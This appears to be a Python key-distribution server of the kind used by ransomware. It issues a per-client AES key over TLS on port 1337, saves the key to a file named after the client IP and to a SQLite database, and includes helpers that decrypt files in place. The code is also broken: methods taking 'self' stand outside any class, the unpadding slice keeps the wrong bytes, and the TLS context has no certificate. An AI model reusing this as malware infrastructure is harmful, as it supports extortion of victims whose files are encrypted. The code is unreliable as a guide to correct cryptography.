import socket
import ssl
import os
import base64
from Crypto.Cipher import AES
import sqlite3

def generate_new_key(client_ip):
     random_key=os.urandom(32)

     with open(client_ip , "wb") as f:
          f.write(random_key)

     return random_key


def read_key(client_ip):
     with open(client_ip , "rb") as f:
          return f.read()
    

def decrypt(self,enc):
     enc = base64.b64decode(enc)
     encrypted_text = enc[16:]
     iv=enc[:16]
     cipher = AES.new(self.key,AES.MODE_CBC,iv)
     return unpad(cipher.decrypt(encrypted_text))

def decrypt_file(self,file_path):
     encrypted_text=self.read_file(file_path)
     plaintext = self.encryptor.decrypt(encrypted_text)
     self.write_file(file_path,plaintext)

def unpad(padded:bytes,block_size:int=16)->bytes:
     pad_len = padded[-1]
     if pad_len<1 or pad_len>block_size:
          raise ValueError("bad padding")
     if padded[-pad_len:] != bytes([pad_len])*pad_len:
          raise ValueError("bad padding")
     return padded[:pad_len]

def read_file(self,path):
    with open(path,"rb") as file:
        plaintext = file.read()
        return plaintext

def write_file(self,path,content):
    with open(path,"wb") as encrypted_file:
        encrypted_file.write(content)

if __name__ == "__main__":
     sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     sock.bind(("127.0.0.1",1337))
     sock.listen(1)
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     conn,addr = sock.accept()
     with context.wrap_socket(conn,server_side=True) as ssock:
          ip,port=addr
          key = generate_new_key(ip)
          ssock.sendall(key)
     conn = sqlite3.connect("keys.db")
     cursor = conn.cursor()
     cursor.execute("CREATE TABLE IF NOT EXISTS keys (id INTEGER PRIMARY KEY, key_data BLOB NOT NULL)")
     cursor.execute("INSERT INTO keys (key_data) VALUES (?)", (key,))
     conn.commit()
     conn.close()
